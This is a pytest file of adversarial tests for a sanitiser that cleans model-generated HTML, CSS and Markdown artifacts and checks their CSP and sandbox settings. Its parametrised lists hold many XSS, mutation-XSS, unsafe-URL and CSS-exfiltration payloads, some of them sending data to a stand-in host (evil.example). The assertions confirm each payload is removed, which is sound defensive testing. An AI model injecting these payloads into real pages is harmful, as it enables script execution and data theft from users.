"""Adversarial tests for artifact sanitisation.

This file is written as an attacker, not as an author. Each payload is a real
technique from the XSS/sanitiser-bypass literature, and the assertions check the
*rendered consequence* (no script element, no handler attribute, no unsafe
scheme survives) rather than a string-equality snapshot of the output -- a
snapshot test would pass when the output changed in a way that happened to
reintroduce a vector.

The final layer, `verify_sanitised`, is exercised directly as well: it is the
assertion that makes a bypass in nh3 loud rather than silent, so it needs its
own tests proving it would actually catch one.
"""

from __future__ import annotations

import pytest

from app.agent.sanitize import (
    ARTIFACT_CSP,
    ARTIFACT_SANDBOX,
    build_artifact_document,
    extract_title,
    is_safe_url,
    response_csp,
    sanitise_css,
    sanitise_css_declarations,
    sanitise_html,
    sanitise_markdown,
    url_scheme,
    verify_sanitised,
)
from app.errors import ArtifactRejected


def clean(raw: str) -> str:
    """Sanitise and return the body, for assertions about what survived."""
    body, _css, _report = sanitise_html(raw)
    return body


def document(raw: str) -> str:
    body, css, _report = sanitise_html(raw)
    return build_artifact_document("T", body, css)


# ----------------------------------------------------------- script removal --

SCRIPT_PAYLOADS = [
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script src='https://evil.example/x.js'></script>",
    "<script\ntype='text/javascript'>alert(1)</script>",
    "<scr<script>ipt>alert(1)</script>",
    "<script >alert(String.fromCharCode(88))</script>",
    "<noscript><p title='</noscript><script>alert(1)</script>'>",
    "<template><script>alert(1)</script></template>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<xmp><script>alert(1)</script></xmp>",
    "<listing><script>alert(1)</script></listing>",
]


@pytest.mark.parametrize("payload", SCRIPT_PAYLOADS)
def test_no_script_element_survives(payload: str) -> None:
    """No executable element survives. Inert *text* that happens to read like
    JavaScript (`<scr<script>ipt>` leaves the characters `ipt>alert(1)` behind
    as a text node) is fine and deliberately not asserted against -- it renders
    as words on a page, and demanding its removal would be asserting on nh3's
    error-recovery rather than on safety."""
    out = clean(payload).lower()
    assert "<script" not in out
    assert "<svg" not in out
    assert "<math" not in out
    assert "onerror" not in out


def test_script_body_is_discarded_not_shown_as_text() -> None:
    """`clean_content_tags` matters: stripping only the tag would render the JS
    source as visible page text, which is confusing rather than dangerous but
    still wrong."""
    assert "alert" not in clean("<script>alert('pwned')</script>Safe text")
    assert "Safe text" in clean("<script>alert('pwned')</script>Safe text")


# --------------------------------------------------- event handler removal --

HANDLER_PAYLOADS = [
    "<img src='https://x.example/a.png' onerror='alert(1)'>",
    "<img src=x onerror=alert(1)>",
    "<b onclick='alert(1)'>click</b>",
    "<div OnMouseOver='alert(1)'>hover</div>",
    "<p onfocus=alert(1) autofocus>x</p>",
    "<body onload='alert(1)'>x</body>",
    "<div onpointerdown='alert(1)'>x</div>",
    "<img src='https://x.example/a.png' /*/onerror=alert(1)//>",
    "<div on\tclick='alert(1)'>x</div>",
    "<a href='https://ok.example' onmouseenter=alert(1)>l</a>",
]


@pytest.mark.parametrize("payload", HANDLER_PAYLOADS)
def test_no_event_handler_attribute_survives(payload: str) -> None:
    out = clean(payload).lower()
    assert "onerror" not in out
    assert "onclick" not in out
    assert "onmouseover" not in out
    assert "onload" not in out
    assert "alert(1)" not in out


def test_every_on_prefixed_attribute_is_treated_as_a_handler() -> None:
    """The rule is the `on` prefix, not a list of known handler names -- new
    handler attributes ship with every browser release."""
    assert "onsomethingbrandnew" not in clean("<div onsomethingbrandnew=alert(1)>x</div>").lower()


# ------------------------------------------------------------ URL schemes ---

UNSAFE_URLS = [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "java\x00script:alert(1)",
    " javascript:alert(1)",
    "\x01javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "blob:https://evil.example/uuid",
    "file:///etc/passwd",
    "//evil.example/payload",
]


@pytest.mark.parametrize("url", UNSAFE_URLS)
def test_unsafe_href_is_removed(url: str) -> None:
    out = clean(f"<a href=\"{url}\">click</a>").lower()
    assert "javascript" not in out
    assert "vbscript" not in out
    assert "data:text/html" not in out
    assert "blob:" not in out
    assert "file://" not in out
    # The link text survives; only the destination is removed.
    assert "click" in out


@pytest.mark.parametrize("url", UNSAFE_URLS)
def test_unsafe_src_is_removed(url: str) -> None:
    out = clean(f'<img src="{url}" alt="x">').lower()
    assert "javascript" not in out
    assert "data:text/html" not in out


def test_entity_encoded_javascript_scheme_is_blocked() -> None:
    """HTML entities are decoded by the parser before the URL is resolved, so
    the scheme check has to run on the decoded value."""
    payload = "<a href='&#106;avascript:alert(1)'>x</a>"
    assert "javascript" not in clean(payload).lower()


def test_safe_schemes_survive() -> None:
    out = clean('<a href="https://lennysnewsletter.com">read</a>')
    assert "https://lennysnewsletter.com" in out
    assert "mailto:" in clean('<a href="mailto:a@b.example">mail</a>')


def test_images_are_restricted_to_https() -> None:
    """Stricter than links on purpose: an image fetches with no user action."""
    assert "http://" not in clean('<img src="http://insecure.example/a.png">')
    assert "https://ok.example/a.png" in clean('<img src="https://ok.example/a.png">')


def test_external_links_get_noopener() -> None:
    """`rel=noopener` stops a popup from reaching back via window.opener."""
    out = clean('<a href="https://ok.example">x</a>')
    assert "noopener" in out and "noreferrer" in out


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("javascript:x", "javascript"),
        ("JAVA\tSCRIPT:x", "javascript"),
        ("https://x.example", "https"),
        ("/relative/path", None),
        ("", None),
    ],
)
def test_url_scheme_normalisation(raw: str, expected: str | None) -> None:
    assert url_scheme(raw) == expected


def test_protocol_relative_urls_are_not_safe() -> None:
    assert not is_safe_url("//evil.example/x")
    assert is_safe_url("https://ok.example/x")


# ------------------------------------------------- embedding and navigation --

EMBED_PAYLOADS = [
    "<iframe src='https://evil.example'></iframe>",
    "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>",
    "<frame src='https://evil.example'>",
    "<frameset><frame src='x'></frameset>",
    "<object data='https://evil.example/x.swf'></object>",
    "<embed src='https://evil.example/x.swf'>",
    "<applet code='Evil.class'></applet>",
    "<portal src='https://evil.example'></portal>",
    "<base href='https://evil.example/'>",
    "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
    "<link rel='stylesheet' href='https://evil.example/x.css'>",
    "<link rel='prefetch' href='https://evil.example/leak'>",
]


@pytest.mark.parametrize("payload", EMBED_PAYLOADS)
def test_embedding_and_navigation_elements_are_removed(payload: str) -> None:
    out = clean(payload).lower()
    for tag in ("<iframe", "<frame", "<object", "<embed", "<applet", "<portal", "<base", "<meta", "<link"):
        assert tag not in out
    assert "evil.example" not in out


FORM_PAYLOADS = [
    "<form action='https://evil.example/collect'><input name='x'></form>",
    "<button formaction='https://evil.example'>go</button>",
    "<input type='text' name='password'>",
    "<textarea name='x'></textarea>",
    "<select><option>x</option></select>",
    "<isindex action='https://evil.example'>",
]


@pytest.mark.parametrize("payload", FORM_PAYLOADS)
def test_form_elements_are_removed(payload: str) -> None:
    out = clean(payload).lower()
    for tag in ("<form", "<input", "<button", "<textarea", "<select", "<isindex"):
        assert tag not in out
    assert "formaction" not in out
    assert "evil.example" not in out


# ---------------------------------------------------- CSS-based exfiltration --

CSS_PAYLOADS = [
    "@import url('https://evil.example/x.css');",
    "@import 'https://evil.example/x.css';",
    "body { background: url('https://evil.example/pixel?leak=1'); }",
    "body { background-image: url(//evil.example/p.png); }",
    "div { width: expression(alert(1)); }",
    "div { behavior: url(#default#userData); }",
    "div { -moz-binding: url('https://evil.example/x.xml#e'); }",
    "@font-face { font-family: x; src: url('https://evil.example/f.woff'); }",
    "input[value^='a'] { background: url('https://evil.example/?a'); }",
    "body { background: URL( 'https://evil.example/x' ); }",
]


@pytest.mark.parametrize("payload", CSS_PAYLOADS)
def test_style_block_cannot_fetch_or_execute(payload: str) -> None:
    css, removed = sanitise_css(payload)
    lowered = css.lower()
    assert "url(" not in lowered
    assert "@import" not in lowered
    assert "@font-face" not in lowered
    assert "expression(" not in lowered
    assert "-moz-binding" not in lowered
    assert "evil.example" not in lowered
    assert removed, "a blocked construct must be reported, not silently dropped"


def test_style_element_contents_are_filtered_not_passed_through() -> None:
    body, css, report = sanitise_html(
        "<style>body { color: red; background: url('https://evil.example/p'); }</style>"
        "<p>hello</p>"
    )
    assert "color: red" in css
    assert "evil.example" not in css
    assert "background" in report.removed_css
    assert "<style" not in body.lower()


def test_safe_css_survives_so_artifacts_can_look_designed() -> None:
    css, removed = sanitise_css(
        "h1 { color: #123456; font-size: 2rem; } "
        "@media (max-width: 600px) { h1 { font-size: 1.4rem; } }"
    )
    assert "color: #123456" in css
    assert "@media" in css
    assert "font-size: 1.4rem" in css
    assert removed == []


def test_style_attribute_is_filtered_per_property() -> None:
    out = clean(
        "<div style=\"color: green; position: fixed; background: url('https://evil.example')\">x</div>"
    )
    assert "color: green" in out
    assert "position" not in out
    assert "evil.example" not in out


def test_style_block_cannot_break_out_of_the_style_element() -> None:
    """`</style><script>` inside CSS would end the element early in a browser."""
    css, _removed = sanitise_css("body { color: red; } </style><script>alert(1)</script>")
    assert "</style" not in css.lower()
    assert "<script" not in css.lower()


def test_css_comment_obfuscation_does_not_smuggle_a_declaration() -> None:
    css, _ = sanitise_css("div { /* */ back/**/ground: url(https://evil.example); }")
    assert "evil.example" not in css


@pytest.mark.parametrize(
    "declaration",
    ["color: red", "COLOR: red", "  color : red  "],
)
def test_allowed_declaration_is_kept_regardless_of_spacing_or_case(declaration: str) -> None:
    kept, removed = sanitise_css_declarations(declaration)
    assert "color: red" in kept
    assert removed == []


def test_unknown_property_is_removed_and_reported() -> None:
    kept, removed = sanitise_css_declarations("color: red; position: absolute; z-index: 99")
    assert "color: red" in kept
    assert "position" in removed and "z-index" in removed


# ---------------------------------------------------------- mXSS / mutation --

MUTATION_PAYLOADS = [
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "<math><annotation-xml encoding='text/html'><script>alert(1)</script></annotation-xml></math>",
    "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
    "<p><svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg></p>",
    "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    "<table><caption><svg><style></caption><img src onerror=alert(1)>",
    "<div><!--<img src=x onerror=alert(1)>--></div>",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<?xml version='1.0'?><script>alert(1)</script>",
]


@pytest.mark.parametrize("payload", MUTATION_PAYLOADS)
def test_foreign_content_and_mutation_payloads_are_neutralised(payload: str) -> None:
    out = clean(payload).lower()
    assert "<script" not in out
    assert "onerror" not in out
    assert "<svg" not in out
    assert "<math" not in out


def test_comments_are_stripped_entirely() -> None:
    assert "<!--" not in clean("<div><!-- secret --><p>x</p></div>")


# ------------------------------------------- the independent verifier layer --


def test_verifier_accepts_properly_sanitised_output() -> None:
    assert verify_sanitised('<p class="x">hello <a href="https://ok.example">link</a></p>') == []


@pytest.mark.parametrize(
    ("html", "fragment"),
    [
        ("<script>alert(1)</script>", "tag:script"),
        ("<div onclick='x'>y</div>", "event-handler:div[onclick]"),
        ("<a href='javascript:alert(1)'>x</a>", "url:a[href]"),
        ("<iframe src='https://x.example'></iframe>", "tag:iframe"),
        ("<div style='position:fixed'>x</div>", "style:div:position"),
        ("<div data-x='1'>y</div>", "attribute:div[data-x]"),
    ],
)
def test_verifier_catches_a_policy_violation_it_is_handed(html: str, fragment: str) -> None:
    """These strings never come out of `sanitise_html` -- they are fed in
    directly to prove the second layer would catch a first-layer bypass."""
    violations = verify_sanitised(html)
    assert any(v.startswith(fragment.split(":")[0]) for v in violations)
    assert any(fragment in v for v in violations)


def test_artifact_is_rejected_rather_than_served_when_layers_disagree(monkeypatch) -> None:
    """If nh3 ever returned something the policy forbids, nothing is served."""
    import app.agent.sanitize as module

    monkeypatch.setattr(module.nh3, "clean", lambda *a, **k: "<script>alert(1)</script>")
    with pytest.raises(ArtifactRejected) as excinfo:
        sanitise_html("<p>anything</p>")
    assert "violations" in (excinfo.value.details or {})


# ------------------------------------------------------- the served document --


def test_document_carries_its_own_csp_with_no_script_source() -> None:
    doc = document("<p>hello</p>")
    assert "Content-Security-Policy" in doc
    assert "default-src 'none'" in doc
    assert "script-src" not in doc  # absent, so default-src 'none' governs script


def test_sandbox_contract_never_grants_same_origin_or_scripts() -> None:
    """The single most important line in this file: `allow-same-origin` would
    put the artifact in the app's origin and undo every other layer."""
    assert "allow-same-origin" not in ARTIFACT_SANDBOX
    assert "allow-scripts" not in ARTIFACT_SANDBOX
    assert "allow-same-origin" not in ARTIFACT_CSP
    assert "allow-scripts" not in ARTIFACT_CSP


def test_response_csp_allows_the_configured_frontend_origins_not_just_self() -> None:
    """A hardcoded `frame-ancestors 'self'` blocks the frontend's own separate
    origin from ever embedding the artifact -- caught live against the real
    frontend (checkpoint 4), not by a unit test that only exercised the
    document's static body."""
    csp = response_csp(["http://localhost:5173", "http://localhost:3000"])
    assert "frame-ancestors 'self' http://localhost:5173 http://localhost:3000;" in csp
    # Everything else about the policy is untouched.
    assert "default-src 'none'" in csp
    assert "allow-same-origin" not in csp
    assert "allow-scripts" not in csp


def test_response_csp_with_no_frontend_origins_still_allows_self() -> None:
    assert "frame-ancestors 'self';" in response_csp([])


def test_model_cannot_author_the_document_head() -> None:
    """A `<meta http-equiv>` in the model output must not reach the head, where
    it could override the CSP or redirect the frame."""
    doc = document(
        "<html><head><meta http-equiv='Content-Security-Policy' content=\"default-src *\">"
        "<title>Evil</title></head><body><p>hi</p></body></html>"
    )
    assert doc.count("Content-Security-Policy") == 1
    assert "default-src *" not in doc
    assert "<p>hi</p>" in doc


def test_document_title_is_escaped() -> None:
    doc = build_artifact_document("</title><script>alert(1)</script>", "<p>x</p>", "")
    assert "<script" not in doc


def test_extract_title_prefers_the_models_own_title() -> None:
    assert extract_title("<title>Launch Checklist</title><h1>Other</h1>") == "Launch Checklist"
    assert extract_title("<h1>Activation Playbook</h1>") == "Activation Playbook"
    assert extract_title("<p>no heading</p>", fallback="Artifact") == "Artifact"


# ------------------------------------------------------------------ report ---


def test_report_records_what_was_removed() -> None:
    _body, _css, report = sanitise_html(
        "<script>alert(1)</script>"
        "<iframe src='https://evil.example'></iframe>"
        "<a href='javascript:alert(1)' onclick='x'>link</a>"
        "<style>body { background: url('https://evil.example/p') }</style>"
    )
    assert "script" in report.removed_tags
    assert "iframe" in report.removed_tags
    assert any("onclick" in a for a in report.removed_attributes)
    assert any("javascript" in u for u in report.blocked_urls)
    assert "background" in report.removed_css
    assert report.modified is True
    assert report.verified is True


def test_clean_input_reports_no_modification() -> None:
    _body, _css, report = sanitise_html("<h1>Title</h1><p>A perfectly ordinary paragraph.</p>")
    assert report.modified is False
    assert report.verified is True


# ---------------------------------------------------------------- markdown --


def test_markdown_html_is_escaped_not_executed() -> None:
    out, report = sanitise_markdown("# Title\n\n<script>alert(1)</script>\n\nText")
    assert "<script>" not in out
    assert "&lt;script&gt;" in out
    assert "script" in report.removed_tags


def test_markdown_img_onerror_is_escaped() -> None:
    out, _ = sanitise_markdown("<img src=x onerror=alert(1)>")
    assert "<img" not in out
    assert "&lt;img" in out


def test_markdown_javascript_link_is_neutralised() -> None:
    out, report = sanitise_markdown("[click](javascript:alert(1))")
    assert "javascript:" not in out
    assert "#blocked-unsafe-url" in out
    assert report.blocked_urls


def test_markdown_data_url_image_is_neutralised() -> None:
    out, _ = sanitise_markdown("![x](data:text/html;base64,PHNjcmlwdD4=)")
    assert "data:text/html" not in out


def test_markdown_autolink_with_unsafe_scheme_is_neutralised() -> None:
    out, _ = sanitise_markdown("<javascript:alert(1)>")
    assert "<javascript:" not in out


def test_markdown_keeps_ordinary_content_intact() -> None:
    source = (
        "# Activation checklist\n\n"
        "- **Instrument the first session** before changing anything\n"
        "- Read [the episode](https://www.youtube.com/watch?v=abc&t=120)\n\n"
        "> Aha moments are earned, not designed.\n"
    )
    out, report = sanitise_markdown(source)
    assert out.strip() == source.strip()
    assert report.modified is False


def test_markdown_relative_link_is_kept() -> None:
    out, _ = sanitise_markdown("[x](./notes.md)")
    assert "./notes.md" in out
